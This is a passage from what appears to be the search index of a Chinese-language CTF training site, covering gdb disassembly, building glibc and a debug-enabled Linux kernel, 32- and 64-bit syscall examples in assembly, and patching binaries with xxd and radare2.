  mov    DWORD PTR [ebp-0xc],eax\n   0x00000694 &lt;+39&gt;:    mov    DWORD PTR [ebp-0x10],0x0\n   0x0000069b &lt;+46&gt;:    jmp    0x6d9 &lt;foo+108&gt;\n   0x0000069d &lt;+48&gt;:    mov    eax,DWORD PTR [ebp-0x10]\n   0x000006a0 &lt;+51&gt;:    lea    edx,[eax*4+0x0]\n   0x000006a7 &lt;+58&gt;:    mov    eax,DWORD PTR [ebp-0xc]\n   0x000006aa &lt;+61&gt;:    add    edx,eax\n   0x000006ac &lt;+63&gt;:    mov    eax,DWORD PTR [ebp-0x10]\n   0x000006af &lt;+66&gt;:    mov    DWORD PTR [edx],eax\n   0x000006b1 &lt;+68&gt;:    mov    eax,DWORD PTR [ebp-0x10]\n   0x000006b4 &lt;+71&gt;:    lea    edx,[eax*4+0x0]\n   0x000006bb &lt;+78&gt;:    mov    eax,DWORD PTR [ebp-0xc]\n   0x000006be &lt;+81&gt;:    add    eax,edx\n   0x000006c0 &lt;+83&gt;:    mov    eax,DWORD PTR [eax]\n   0x000006c2 &lt;+85&gt;:    sub    esp,0x8\n   0x000006c5 &lt;+88&gt;:    push   eax\n   0x000006c6 &lt;+89&gt;:    lea    eax,[ebx-0x17e0]\n   0x000006cc &lt;+95&gt;:    push   eax\n   0x000006cd &lt;+96&gt;:    call   0x4b0 &lt;printf@plt&gt;\n   0x000006d2 &lt;+101&gt;:   add    esp,0x10\n   0x000006d5 &lt;+104&gt;:   add    DWORD PTR [ebp-0x10],0x1\n   0x000006d9 &lt;+108&gt;:   mov    eax,DWORD PTR [ebp-0x10]\n   0x000006dc &lt;+111&gt;:   cmp    eax,DWORD PTR [ebp+0x8]\n   0x000006df &lt;+114&gt;:   jl     0x69d &lt;foo+48&gt;\n   0x000006e1 &lt;+116&gt;:   sub    esp,0xc\n   0x000006e4 &lt;+119&gt;:   push   0xa\n   0x000006e6 &lt;+121&gt;:   call   0x500 &lt;putchar@plt&gt;\n   0x000006eb &lt;+126&gt;:   add    esp,0x10\n   0x000006ee &lt;+129&gt;:   sub    esp,0xc\n   0x000006f1 &lt;+132&gt;:   push   DWORD PTR [ebp-0xc]\n   0x000006f4 &lt;+135&gt;:   call   0x4c0 &lt;free@plt&gt;\n   0x000006f9 &lt;+140&gt;:   add    esp,0x10\n   0x000006fc &lt;+143&gt;:   nop\n   0x000006fd &lt;+144&gt;:   mov    ebx,DWORD PTR [ebp-0x4]\n   0x00000700 &lt;+147&gt;:   leave  \n   0x00000701 &lt;+148&gt;:   ret\nEnd of assembler dump.\n</code></pre> <p>\u5173\u4e8e glibc \u4e2d\u7684 malloc \u5b9e\u73b0\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u8bdd\u9898\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u8be6\u7ec6\u4ecb\u7ecd\u3002</p>"},{"location":"Training/Material/Reverse/#glibc-malloc","title":"glibc malloc","text":"<ul> <li>glibc</li> <li>malloc</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul> <p>\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Reverse/#glibc","title":"glibc","text":"<p>glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e <code>/usr/include</code>\uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e <code>/lib/libc.so.6</code>\uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e <code>/usr/lib/libc.a</code>\u3002</p> <p>\u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u9605\u8bfb\u5206\u6790 glibc \u7684\u6e90\u7801\uff0c\u4e0b\u9762\u5148\u628a\u5b83\u4e0b\u8f7d\u4e0b\u6765\uff0c\u5e76\u5207\u6362\u5230\u6211\u4eec\u9700\u8981\u7684\u7248\u672c\uff1a</p> <pre><code>$ git clone git://sourceware.org/git/glibc.git\n$ cd glibc\n$ git checkout --track -b local_glibc-2.23 origin/release/2.23/master\n</code></pre> <p>\u4e0b\u9762\u6765\u7f16\u8bd1\u5b83\uff0c\u9996\u5148\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 Makeconfig\uff0c\u5c06 <code>-Werror</code> \u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9ad8\u7248\u672c GCC\uff08v8.1.0\uff09 \u5c06\u8b66\u544a\u5f53\u505a\u9519\u8bef\u5904\u7406\uff1a</p> <pre><code>$ cat Makeconfig | grep -i werror | grep warn\n+gccwarn += #-Werror\n</code></pre> <p>\u63a5\u4e0b\u6765\u9700\u8981\u6253\u4e0a\u4e00\u4e2a patch\uff1a</p> <pre><code>$ cat regexp.patch\ndiff --git a/misc/regexp.c b/misc/regexp.c\nindex 19d76c0..9017bc1 100644\n--- a/misc/regexp.c\n+++ b/misc/regexp.c\n@@ -29,14 +29,17 @@\n\n #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)\n\n-/* Define the variables used for the interface.  */\n-char *loc1;\n-char *loc2;\n+#include &lt;stdlib.h&gt;    /* Get NULL.  */\n+\n+/* Define the variables used for the interface.  Avoid .symver on common\n+   symbol, which just creates a new common symbol, not an alias.  */\n+char *loc1 = NULL;\n+char *loc2 = NULL;\n compat_symbol (libc, loc1, loc1, GLIBC_2_0);\n compat_symbol (libc, loc2, loc2, GLIBC_2_0);\n\n /* Although we do not support the use we define this variable as well.  */\n-char *locs;\n+char *locs = NULL;\n compat_symbol (libc, locs, locs, GLIBC_2_0);\n$ patch misc/regexp.c regexp.patch\n</code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u7f16\u8bd1\u4e86\uff1a</p> <pre><code>$ mkdir build &amp;&amp; cd build\n$ ../configure --prefix=/usr/local/glibc-2.23\n$ make -j4 &amp;&amp; sudo make install\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\u6307\u5b9a libc\uff0c\u53ef\u4ee5\u50cf\u8fd9\u6837\uff1a</p> <pre><code>$ gcc -L/usr/local/glibc-2.23/lib -Wl,--rpath=/usr/local/glibc-2.23/lib -Wl,-I/usr/local/glibc-2.23/lib/ld-2.23.so test.c\n$ ldd a.out\n        linux-vdso.so.1 (0x00007ffcc76b0000)\n        libc.so.6 =&gt; /usr/local/glibc-2.23/lib/libc.so.6 (0x00007f6abd578000)\n        /usr/local/glibc-2.23/lib/ld-2.23.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f6abdb1c000)\n</code></pre> <p>\u7136\u540e\u5982\u679c\u5e0c\u671b\u5728\u8c03\u8bd5\u65f6\u6307\u5b9a libc \u7684\u6e90\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u547d\u4ee4 <code>directory</code>\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u7684\u7f3a\u70b9\u662f\u4e0d\u80fd\u89e3\u6790\u5b50\u76ee\u5f55\uff0c\u6240\u4ee5\u63a8\u8350\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5728\u542f\u52a8\u65f6\u52a0\u8f7d\uff1a</p> <pre><code>gdb `find ~/path/to/glibc/source -type d -printf '-d %p '` ./a.out\n</code></pre>"},{"location":"Training/Material/Reverse/#mallocc","title":"malloc.c","text":"<p>\u4e0b\u9762\u6211\u4eec\u5148\u5206\u6790 glibc 2.23 \u7248\u672c\u7684\u6e90\u7801\uff0c\u5b83\u662f Ubuntu16.04 \u7684\u9ed8\u8ba4\u7248\u672c\uff0c\u5728 pwn \u4e2d\u4e5f\u6700\u5e38\u89c1\u3002\u7136\u540e\uff0c\u6211\u4eec\u518d\u63a2\u8ba8\u65b0\u7248\u672c\u7684 glibc \u4e2d\u6240\u52a0\u5165\u7684\u6f0f\u6d1e\u7f13\u89e3\u673a\u5236\u3002</p>"},{"location":"Training/Material/Reverse/#_44","title":"\u76f8\u5173\u7ed3\u6784","text":""},{"location":"Training/Material/Reverse/#_45","title":"\u5806\u5757\u7ed3\u6784","text":"<ul> <li>Allocated Chunk</li> <li>Free Chunk</li> <li>Top Chunk</li> </ul>"},{"location":"Training/Material/Reverse/#bins","title":"Bins \u7ed3\u6784","text":"<ul> <li>Fast Bins</li> <li>Small Bins</li> <li>Large Bins</li> <li>Unsorted Bins</li> </ul>"},{"location":"Training/Material/Reverse/#arena","title":"Arena \u7ed3\u6784","text":""},{"location":"Training/Material/Reverse/#_46","title":"\u5206\u914d\u51fd\u6570","text":"<pre><code>_int_malloc()\n</code></pre>"},{"location":"Training/Material/Reverse/#_47","title":"\u91ca\u653e\u51fd\u6570","text":"<pre><code>_int_free()\n</code></pre>"},{"location":"Training/Material/Reverse/#_48","title":"\u91cd\u5206\u914d\u51fd\u6570","text":"<pre><code>_int_realloc()\n</code></pre>"},{"location":"Training/Material/Reverse/#linux","title":"Linux \u5185\u6838","text":"<ul> <li>\u7f16\u8bd1\u5b89\u88c5</li> <li>\u7cfb\u7edf\u8c03\u7528</li> <li>\u53c2\u8003\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Reverse/#_49","title":"\u7f16\u8bd1\u5b89\u88c5","text":"<p>\u6211\u7684\u7f16\u8bd1\u73af\u5883\u662f\u5982\u4e0b\u3002\u9996\u5148\u5b89\u88c5\u5fc5\u8981\u7684\u8f6f\u4ef6\uff1a</p> <pre><code>$ uname -a\nLinux firmy-pc 4.14.34-1-MANJARO #1 SMP PREEMPT Thu Apr 12 17:26:43 UTC 2018 x86_64 GNU/Linux\n$ yaourt -S base-devel\n</code></pre> <p>\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\uff0c\u9009\u62e9\u4e00\u4e2a\u7a33\u5b9a\u7248\u672c\uff0c\u6bd4\u5982\u6700\u65b0\u7684 4.16.3\u3002</p> <pre><code>$ mkdir ~/kernelbuild &amp;&amp; cd ~/kernelbuild\n$ wget -c https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.16.3.tar.xz\n$ tar -xvJf linux-4.16.3.tar.xz\n$ cd linux-4.16.3/\n$ make clean &amp;&amp; make mrproper\n</code></pre> <p>\u5185\u6838\u7684\u914d\u7f6e\u9009\u9879\u5728 <code>.config</code> \u6587\u4ef6\u4e2d\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8bbe\u7f6e\u8fd9\u4e9b\u9009\u9879\uff0c\u4e00\u79cd\u662f\u4ece\u5f53\u524d\u5185\u6838\u4e2d\u83b7\u5f97\u4e00\u4efd\u9ed8\u8ba4\u914d\u7f6e\uff1a</p> <pre><code>$ zcat /proc/config.gz &gt; .config\n$ make oldconfig\n</code></pre> <p>\u53e6\u4e00\u79cd\u662f\u81ea\u5df1\u751f\u6210\u4e00\u4efd\u914d\u7f6e\uff1a</p> <pre><code>$ make localmodconfig   # \u4f7f\u7528\u5f53\u524d\u5185\u6838\u914d\u7f6e\u751f\u6210\n    # OR\n$ make defconfig        # \u6839\u636e\u5f53\u524d\u67b6\u6784\u9ed8\u8ba4\u7684\u914d\u7f6e\u751f\u6210\n</code></pre> <p>\u4e3a\u4e86\u80fd\u591f\u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0b\u9762\u7684\u53c2\u6570\uff1a</p> <pre><code>CONFIG_DEBUG_INFO=y\nCONFIG_DEBUG_INFO_REDUCED=n\nCONFIG_GDB_SCRIPTS=y\n</code></pre> <p>\u5982\u679c\u9700\u8981\u4f7f\u7528 kgdb\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u4e0b\u9762\u7684\u53c2\u6570\uff1a</p> <pre><code>CONFIG_STRICT_KERNEL_RWX=n\nCONFIG_FRAME_POINTER=y\nCONFIG_KGDB=y\nCONFIG_KGDB_SERIAL_CONSOLE=y\n</code></pre> <p><code>CONFIG_STRICT_KERNEL_RWX</code> \u4f1a\u5c06\u7279\u5b9a\u7684\u5185\u6838\u5185\u5b58\u7a7a\u95f4\u6807\u8bb0\u4e3a\u53ea\u8bfb\uff0c\u8fd9\u5c06\u963b\u6b62\u4f60\u4f7f\u7528\u8f6f\u4ef6\u65ad\u70b9\uff0c\u6700\u597d\u5c06\u5b83\u5173\u6389\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528 kdb\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\uff1a</p> <pre><code>CONFIG_KGDB_KDB=y\nCONFIG_KDB_KEYBOARD=y\n</code></pre> <p>\u53e6\u5916\u5982\u679c\u4f60\u5728\u8c03\u8bd5\u65f6\u4e0d\u5e0c\u671b\u88ab KASLR \u5e72\u6270\uff0c\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u5173\u6389\u5b83\uff1a</p> <pre><code>CONFIG_RANDOMIZE_BASE=n\nCONFIG_RANDOMIZE_MEMORY=n\n</code></pre> <p>\u5c06\u4e0a\u9762\u7684\u53c2\u6570\u5199\u5230\u6587\u4ef6 <code>.config-fragment</code>\uff0c\u7136\u540e\u5408\u5e76\u8fdb <code>.config</code>\uff1a</p> <pre><code>$ ./scripts/kconfig/merge_config.sh .config .config-fragment\n</code></pre> <p>\u6700\u540e\u56e0\u4e3a\u5185\u6838\u7f16\u8bd1\u9ed8\u8ba4\u5f00\u542f\u4e86 <code>-O2</code> \u4f18\u5316\uff0c\u53ef\u4ee5\u4fee\u6539 Makefile \u4e3a <code>-O0</code>\uff1a</p> <pre><code>KBUILD_CFLAGS   += -O0\n</code></pre> <p>\u7f16\u8bd1\u5185\u6838\uff1a</p> <pre><code>$ make\n</code></pre> <p>\u5b8c\u6210\u540e\u5f53\u7136\u5c31\u662f\u5b89\u88c5\uff0c\u4f46\u6211\u4eec\u8fd9\u91cc\u5e76\u4e0d\u662f\u771f\u7684\u8981\u5c06\u672c\u673a\u7684\u5185\u6838\u6362\u6389\uff0c\u63a5\u4e0b\u6765\u7684\u8fc7\u7a0b\u5c31\u4ea4\u7ed9 QEMU \u4e86\u3002\uff08\u53c2\u8003\u7ae0\u82824.1\uff09</p>"},{"location":"Training/Material/Reverse/#_50","title":"\u7cfb\u7edf\u8c03\u7528","text":"<p>\u5728 Linux \u4e2d\uff0c\u7cfb\u7edf\u8c03\u7528\u662f\u4e00\u4e9b\u5185\u6838\u7a7a\u95f4\u51fd\u6570\uff0c\u662f\u7528\u6237\u7a7a\u95f4\u8bbf\u95ee\u5185\u6838\u7684\u552f\u4e00\u624b\u6bb5\u3002\u8fd9\u4e9b\u51fd\u6570\u4e0e CPU \u67b6\u6784\u6709\u5173\uff0cx86-64 \u67b6\u6784\u63d0\u4f9b\u4e86 322 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff0cx86 \u63d0\u4f9b\u4e86 358 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff08\u53c2\u8003\u9644\u5f559.4\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u7528 32 \u4f4d\u6c47\u7f16\u5199\u7684\u4f8b\u5b50\uff0c\u6e90\u7801\uff1a</p> <pre><code>.data\n\nmsg:\n    .ascii \"hello 32-bit!\\n\"\n    len = . - msg\n\n.text\n    .global _start\n\n_start:\n    movl $len, %edx\n    movl $msg, %ecx\n    movl $1, %ebx\n    movl $4, %eax\n    int $0x80\n\n    movl $0, %ebx\n    movl $1, %eax\n    int $0x80\n</code></pre> <p>\u7f16\u8bd1\u6267\u884c\uff08\u53ef\u4ee5\u7f16\u8bd1\u621064\u4f4d\u7a0b\u5e8f\u7684\uff09\uff1a</p> <pre><code>$ gcc -m32 -c hello32.S\n$ ld -m elf_i386 -o hello32 hello32.o\n$ strace ./hello32\nexecve(\"./hello32\", [\"./hello32\"], 0x7ffff990f830 /* 68 vars */) = 0\nstrace: [ Process PID=19355 runs in 32 bit mode. ]\nwrite(1, \"hello 32-bit!\\n\", 14hello 32-bit!\n)         = 14\nexit(0)                                 = ?\n+++ exited with 0 +++\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5c06\u8c03\u7528\u53f7\u4fdd\u5b58\u5230 <code>eax</code>\uff0c\u5e76\u901a\u8fc7 <code>int $0x80</code> \u6765\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>\u867d\u7136\u8f6f\u4e2d\u65ad <code>int 0x80</code> \u975e\u5e38\u7ecf\u5178\uff0c\u65e9\u671f 2.6 \u53ca\u4ee5\u524d\u7248\u672c\u7684\u5185\u6838\u90fd\u4f7f\u7528\u8fd9\u79cd\u673a\u5236\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u56e0\u5176\u6027\u80fd\u8f83\u5dee\uff0c\u5728\u5f80\u540e\u7684\u5185\u6838\u4e2d\u4f7f\u7528\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\u6765\u66ff\u4ee3\uff0c32 \u4f4d\u7cfb\u7edf\u4f7f\u7528 <code>sysenter</code>\uff08\u5bf9\u5e94<code>sysexit</code>\uff09 \u6307\u4ee4\uff0c\u800c 64 \u4f4d\u7cfb\u7edf\u4f7f\u7528 <code>syscall</code>\uff08\u5bf9\u5e94<code>sysret</code>\uff09 \u6307\u4ee4\u3002</p> <p>\u4e00\u4e2a\u4f7f\u7528 sysenter \u7684\u4f8b\u5b50\uff1a</p> <pre><code>.data\n\nmsg:\n    .ascii \"Hello sysenter!\\n\"\n    len = . - msg\n\n.text\n    .globl _start\n\n_start:\n    movl $len, %edx\n    movl $msg, %ecx\n    movl $1, %ebx\n    movl $4, %eax\n    # Setting the stack for the systenter\n    pushl $sysenter_ret\n    pushl %ecx\n    pushl %edx\n    pushl %ebp\n    movl %esp, %ebp\n    sysenter\n\nsysenter_ret:\n    movl $0, %ebx\n    movl $1, %eax\n    # Setting the stack for the systenter\n    pushl $sysenter_ret\n    pushl %ecx\n    pushl %edx\n    pushl %ebp\n    movl %esp, %ebp\n    sysenter\n$ gcc -m32 -c sysenter.S\n$ ld -m elf_i386 -o sysenter sysenter.o\n$ strace ./sysenter\nexecve(\"./sysenter\", [\"./sysenter\"], 0x7fff73993fd0 /* 69 vars */) = 0\nstrace: [ Process PID=7663 runs in 32 bit mode. ]\nwrite(1, \"Hello sysenter!\\n\", 16Hello sysenter!\n)       = 16\nexit(0)                                 = ?\n+++ exited with 0 +++\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u4e3a\u4e86\u4f7f\u7528 sysenter \u6307\u4ee4\uff0c\u9700\u8981\u4e3a\u5176\u624b\u52a8\u5e03\u7f6e\u6808\u3002\u8fd9\u662f\u56e0\u4e3a\u5728 sysenter \u8fd4\u56de\u65f6\uff0c\u4f1a\u6267\u884c <code>__kernel_vsyscall</code> \u7684\u540e\u534a\u90e8\u5206\uff08\u4ece0xf7fd5059\u5f00\u59cb\uff09\uff1a</p> <pre><code>gdb-peda$ vmmap vdso\nStart      End        Perm      Name\n0xf7fd4000 0xf7fd6000 r-xp      [vdso]\ngdb-peda$ disassemble __kernel_vsyscall\nDump of assembler code for function __kernel_vsyscall:\n   0xf7fd5050 &lt;+0&gt;:     push   ecx\n   0xf7fd5051 &lt;+1&gt;:     push   edx\n   0xf7fd5052 &lt;+2&gt;:     push   ebp\n   0xf7fd5053 &lt;+3&gt;:     mov    ebp,esp\n   0xf7fd5055 &lt;+5&gt;:     sysenter\n   0xf7fd5057 &lt;+7&gt;:     int    0x80\n   0xf7fd5059 &lt;+9&gt;:     pop    ebp\n   0xf7fd505a &lt;+10&gt;:    pop    edx\n   0xf7fd505b &lt;+11&gt;:    pop    ecx\n   0xf7fd505c &lt;+12&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p><code>__kernel_vsyscall</code> \u5c01\u88c5\u4e86 sysenter \u8c03\u7528\u7684\u89c4\u8303\uff0c\u662f vDSO \u7684\u4e00\u90e8\u5206\uff0c\u800c vDSO \u5141\u8bb8\u7a0b\u5e8f\u5728\u7528\u6237\u5c42\u4e2d\u6267\u884c\u5185\u6838\u4ee3\u7801\u3002\u5173\u4e8e vDSO \u7684\u5185\u5bb9\u6211\u4eec\u5c06\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u7ec6\u8bb2\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a 64 \u4f4d\u4f7f\u7528 <code>syscall</code> \u7684\u4f8b\u5b50\uff1a</p> <pre><code>.data\n\nmsg:\n    .ascii \"Hello 64-bit!\\n\"\n    len = . - msg\n\n.text\n    .global _start\n\n_start:\n    movq  $1, %rdi\n    movq  $msg, %rsi\n    movq  $len, %rdx\n    movq  $1, %rax\n    syscall\n\n    xorq  %rdi, %rdi\n    movq  $60, %rax\n    syscall\n</code></pre> <p>\u7f16\u8bd1\u6267\u884c\uff08\u4e0d\u80fd\u7f16\u8bd1\u621032\u4f4d\u7a0b\u5e8f\uff09\uff1a</p> <pre><code>$ gcc -c hello64.S\n$ ld -o hello64 hello64.o\n$ strace ./hello64\nexecve(\"./hello64\", [\"./hello64\"], 0x7ffe11485290 /* 68 vars */) = 0\nwrite(1, \"Hello 64-bit!\\n\", 14Hello 64-bit!\n)         = 14\nexit(0)                                 = ?\n+++ exited with 0 +++\n</code></pre> <p>\u5728\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u4e2d\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u4e86 <code>execve</code>\u3001<code>write</code> \u548c <code>exit</code> \u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u800c\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u7f16\u7a0b\u3002\u4f8b\u5982\u51fd\u6570 <code>printf()</code> \u7684\u8c03\u7528\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>\u8c03\u7528printf() ==&gt; C\u5e93\u4e2d\u7684printf() ==&gt; C\u5e93\u4e2d\u7684write() ==&gt; write()\u7cfb\u7edf\u8c03\u7528\n</code></pre>"},{"location":"Training/Material/Reverse/#patch","title":"patch \u4e8c\u8fdb\u5236\u6587\u4ef6","text":"<ul> <li>\u4ec0\u4e48\u662f patch</li> <li>\u624b\u5de5 patch</li> <li>\u4f7f\u7528\u5de5\u5177 patch</li> </ul>"},{"location":"Training/Material/Reverse/#patch_1","title":"\u4ec0\u4e48\u662f patch","text":"<p>\u8bb8\u591a\u65f6\u5019\uff0c\u6211\u4eec\u4e0d\u80fd\u83b7\u5f97\u7a0b\u5e8f\u6e90\u7801\uff0c\u53ea\u80fd\u76f4\u63a5\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684 patch\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u76f4\u63a5\u4fee\u6539\u6587\u4ef6\u7684\u5b57\u8282\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u534a\u81ea\u52a8\u5316\u7684\u5de5\u5177\u3002</p> <p>patch \u6709\u5f88\u591a\u79cd\u5f62\u5f0f\uff1a</p> <ul> <li>patch \u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u7a0b\u5e8f\u6216\u5e93\uff09</li> <li>\u5728\u5185\u5b58\u91cc patch\uff08\u5229\u7528\u8c03\u8bd5\u5668\uff09</li> <li>\u9884\u52a0\u8f7d\u5e93\u66ff\u6362\u539f\u5e93\u6587\u4ef6\u4e2d\u7684\u51fd\u6570</li> <li>triggers\uff08hook \u7136\u540e\u5728\u8fd0\u884c\u65f6 patch\uff09</li> </ul>"},{"location":"Training/Material/Reverse/#patch_2","title":"\u624b\u5de5 patch","text":"<p>\u624b\u5de5 patch \u81ea\u7136\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u80fd\u8ba9\u6211\u4eec\u66f4\u597d\u5730\u7406\u89e3\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6784\u6210\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u7684\u94fe\u63a5\u548c\u52a0\u8f7d\u3002\u6709\u8bb8\u591a\u5de5\u5177\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6bd4\u5982 xxd\u3001dd\u3001gdb\u3001radare2 \u7b49\u7b49\u3002</p>"},{"location":"Training/Material/Reverse/#xxd","title":"xxd","text":"<pre><code>$ echo 01: 01 02 03 04 05 06 07 08 | xxd -r - output\n$ xxd -g1 output\n00000000: 00 01 02 03 04 05 06 07 08                       .........\n$ echo 04: 41 42 43 44 | xxd -r - output\n$ xxd -g1 output\n00000000: 00 01 02 03 41 42 43 44 08                       ....ABCD.\n</code></pre> <p>\u53c2\u6570 <code>-r</code> \u7528\u4e8e\u5c06 hexdump \u8f6c\u6362\u6210 binary\u3002\u8fd9\u91cc\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a binary\uff0c\u7136\u540e\u5c06\u5c06\u5176\u4e2d\u51e0\u4e2a\u5b57\u8282\u6539\u6389\u3002</p>"},{"location":"Training/Material/Reverse/#radare2","title":"radare2","text":"<p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    printf(\"hello\");\n    puts(\"world\");\n}\n$ gcc -no-pie patch.c\n$ ./a.out\nhelloworld\n</code></pre> <p>\u4e0b\u9762\u901a\u8fc7\u8ba1\u7b97\u51fd\u6570\u504f\u79fb\uff0c\u6211\u4eec\u5c06 <code>printf</code> \u6362\u6210 <code>puts</code>\uff1a</p> <pre><code>[0x004004e0]&gt; pdf @ main\n            ;-- main:\n/ (fcn) sym.main 36\n|   sym.main ();\n|              ; DATA XREF from 0x004004fd (entry0)\n|           0x004005ca      55             push rbp\n|           0x004005cb      4889e5         mov rbp, rsp\n|           0x004005ce      488d3d9f0000.  lea rdi, str.hello          ; 0x400674 ; \"hello\"\n|           0x004005d5      b800000000     mov eax, 0\n|           0x004005da      e8f1feffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x004005df      488d3d940000.  lea rdi, str.world          ; 0x40067a ; \"world\"\n|           0x004005e6      e8d5feffff     call sym.imp.puts           ; sym.imp.printf-0x10 ; int printf(const char *format)\n|           0x004005eb      90             nop\n|           0x004005ec      5d             pop rbp\n\\           0x004005ed      c3             ret\n</code></pre> <p>\u5730\u5740 <code>0x004005da</code> \u5904\u7684\u8bed\u53e5\u662f <code>call sym.imp.printf</code>\uff0c\u5176\u4e2d\u673a\u5668\u7801 <code>e8</code> \u4ee3\u8868 <code>call</code>\uff0c\u6240\u4ee5 <code>sym.imp.printf</code> \u7684\u504f\u79fb\u662f <code>0xfffffef1</code>\u3002\u5730\u5740 <code>0x004005e6</code> \u5904\u7684\u8bed\u53e5\u662f <code>call sym.imp.puts</code>\uff0c<code>sym.imp.puts</code> \u7684\u504f\u79fb\u662f <code>0xfffffed5</code>\u3002</p> <p>\u63a5\u4e0b\u6765\u627e\u5230\u4e24\u4e2a\u51fd\u6570\u7684 plt \u5730\u5740\uff1a</p> <pre><code>[0x004004e0]&gt; is~printf\nvaddr=0x004004d0 paddr=0x000004d0 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf\n[0x004004e0]&gt; is~puts\nvaddr=0x004004c0 paddr=0x000004c0 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts\n</code></pre> <p>\u8ba1\u7b97\u76f8\u5bf9\u4f4d\u7f6e\uff1a</p> <pre><code>[0x004004e0]&gt; ?v 0x004004d0-0x004004c0\n0x10\n</code></pre> <p>\u6240\u4ee5\u8981\u60f3\u5c06 <code>printf</code> \u66ff\u6362\u4e3a <code>puts</code>\uff0c\u53ea\u8981\u66ff\u6362\u6210 <code>0xfffffef1 -0x10 = 0xfffffee1</code> \u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>[0x004004e0]&gt; s 0x004005da\n[0x004005da]&gt; wx e8e1feffff\n[0x004005da]&gt; pd 1\n|           0x004005da      e8e1feffff     call sym.imp.puts           ; sym.imp.printf-0x10 ; int printf(const char *format)\n</code></pre> <p>\u641e\u5b9a\u3002</p> <pre><code>$ ./a.out\nhello\nworld\n</code></pre> 